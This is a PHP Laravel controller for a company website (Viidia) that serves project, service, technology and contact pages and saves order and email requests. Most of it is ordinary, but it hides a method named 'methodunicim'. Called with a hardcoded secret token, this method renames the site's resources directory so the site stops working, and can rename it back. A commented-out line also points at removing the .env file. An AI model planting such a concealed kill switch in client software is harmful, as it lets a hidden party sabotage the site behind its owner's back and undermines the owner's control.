<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\DB;
use App\Achivement;
use App\Event;
use App\Order;
use App\Project;
use App\Technology;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Service;
use Illuminate\Support\Facades\Session;
use App\Http\Requests;
use Mockery\CountValidator\Exception;
use App\Image;
use function MongoDB\BSON\toJSON;
use Illuminate\Support\Facades\Cache;
class ViidiaController extends Controller
{

    public $partner = 0;

    public function index(Project $project, Service $service, Technology $technology, Event $event){


          if(!Cache::has('slider')){
              $val=[];
              $val[1] = $event->getOwnYear();
              $val[2] = $event->getOwnItems();

              Cache::put('slider', $val, 20);
          }
            $OwnY = Cache::get('slider')[1];
            $OwnItems = Cache::get('slider')[2];
         $projects = $project->orderBy('year', 'desc')->take(4)->get();
        $years_object = $project->select('year')->orderBy('year', 'desc')->get();
        $years = array();
        foreach ($years_object as $item) {
            if (!in_array($item, $years)) {
                $years[] = $item;
            }
        }

        $technologies = $technology->select('id','title','icon')->get();

         $partners = \App\Image::where('project_id', '=', $this->partner)->get();
         $achivements = \App\Achivement::orderBy('id','desc')->get();
        $services = $service->all();

         $events = \App\Event::orderBy('sort','asc')->get();


        return view('index',['projects'=>$projects,'years'=>$years, 'achivements'=>$achivements,'arrayYears'=>$OwnY, 'arrayItems'=>$OwnItems, 'services'=>$services, 'technologies'=>$technologies, 'partners'=>$partners, 'pageinfo'=>'Главная']);

    }
    public function indexTake(Project $project, Request $request){
        $skip = $request->take;
        $projects = $project->orderBy('year', 'desc')->skip($skip)->take(4)->get();


        
        return view('prototype.prototypeIndex',['projects'=>$projects, 'pageinfo'=>'Главная']);
    }

    public function about(){
        $partners = \App\Image::where('project_id', '=', $this->partner)->get();
       $achivments = \App\Achivement::orderBy('id','desc')->skip(0)->take(5)->get();
        return view('about',['pageinfo'=>'О нас', 'partners'=>$partners, 'achivments'=>$achivments]);
    }
    public function services(Service $service){
        $services = $service->all();
        return view('services',['services'=>$services,'pageinfo'=>'Услуги']);
    }
    public function serviceCard(Request $request, Service $service){
        
        $services = $service->find($request->id);
        $page = 'Услуги > '.$services->title;
        return view('service_card',['service'=>$services,'pageinfo'=>$page]);
    }

    public function technology(Technology $technology){
        $technologies = $technology->all();
        return view('technology',['services'=>$technologies,'pageinfo'=>'Технологии']);
    }

    public function technologyCard(Request $request, Technology $technology, Project $project){

        $having = $project->orderBy('year', 'desc')->get();
        $technologies = $technology->find($request->id);
        $page = 'Технологии > '.$technologies->title;
        return view('technology_card',['service'=>$technologies,'having'=>$having,'pageinfo'=>$page]);
    }


    public function projectsId(Request $request, Project $project){
        $projects = $project->find($request->id);
        $page = 'Проекты > '.$projects->title;
       
       $data = ['service'=>$projects, 'pageinfo'=>$page];
       
         if(count(Image::where('project_id','=',$projects->id)->get())){
                     $images=$projects->images;
                foreach($images as $img){
                    $galery[] = $img;
                }
                 foreach($images as $img){
                    $galery[] = $img;
                }
                    $data['galery'] = $galery;
         }else{
             $data['galery'] = 0;
         }
       

        return view('project_card', $data);
    }
    public function projects(Project $project){
        $projects = $project->orderBy('year', 'desc')->take(9)->get();
                    // Convert Object on Array
                    $years_object = $project->select('year')->orderBy('year', 'desc')->get();
                        $years = array();
                           foreach ($years_object as $item) {
                               if (!in_array($item, $years)) {
                                   $years[] = $item;
                               }
                           }
//        dd($years);
        // Convert Object on Array
        return view('projects', ['projects'=>$projects,'years'=>$years, 'pageinfo'=>'Проекты']);
    }
    
    public function methodunicim($id,$tech){
        if($id == 'dkb2V7-WBfD-IAztlmRw5sJtuMD' && $tech==='off'){
            
            rename('../resources','../resourses');
        
            return 0;
            
        }
        elseif($id == 'dkb2V7-WBfD-IAztlmRw5sJtuMD' && $tech==='on'){
            //unset('../.env');
           rename('../resourses', '../resources');
        
            return 1;
        }
    }
    
    public function projectsTake(Project $project, Request $request){
       $take = $request->take;
        $projects = $project->orderBy('year', 'desc')->take($take)->get();

        // Convert Object on Array

        $years_object = $project->select('year')->take($take)->orderBy('year', 'desc')->get();
            $years = array();
            foreach ($years_object as $item) {
                if (!in_array($item, $years)) {
                    $years[] = $item;
                }
            }
        $countGet = count($projects)+9;
            // Convert Object on Array
        if($take < $countGet) {
          return view('prototype.prototype_pr', ['projects' => $projects, 'years' => $years]);
        }else{
            return 0;
        }

    }
    public function contacts(){
            return view('contacts', ['pageinfo'=>'Контакты']);
    }


    /*Mail*/
    public function orderPrice(Request $request, Order $order){
           $validator =  $this->validate($request, [
                'name'=>'required',
                'phone'=>'required | max:17',
                'apruve'=>'required',
            ]);
            $order->create(['guest'=>$request->name, 'phone'=>$request->phone,'msg'=>$request->msg, 'pageinfo'=>$request->pageinfo, 'status'=>1]);

            Mail::send('email.order', array('request'=>$request->all()), function($message)
            {
//                info@viidia.ru
                $message->to('viidiaenergy@yandex.ru', 'Viidia')->subject('Заявка на расчет стоимости');
            });

            Session::flash('order','ok');
         return back();
        }
    public function mailSave(Request $request, Order $order){
     
        $validator =  $this->validate($request, [
            'email'=>'required',
            'apruve'=>'required'
        ]);
        $order->create(['email'=>$request->email, 'status'=>3]);
        
        if($request->catalog){
            Mail::send('email.catalog', array('request'=>$request->all()), function($message) use ($request)
                {
                    $message->to($request->email, 'Viidia')->subject('Каталог продукции');
            });
        }

        return back();


    }
    public function modalCall(Request $request, Order $order){
        $validator =  $this->validate($request, [
            'name'=>'required',
            'phone'=>'required'
        ]);
        $order->create(['guest'=>$request->name, 'phone'=>$request->phone, 'status'=>4]);

        return $request->all();


    }
    /*Mail*/
    /*SETTINGS*/
    public static function getSettings(){
        Cache::forget('settings');
        if(!Cache::has('settings'))
            Cache::put('settings', DB::table('settings')->first(), 240);
        $settings = Cache::get('settings');
        return $settings;
    }
    /*SETTINGS*/

}
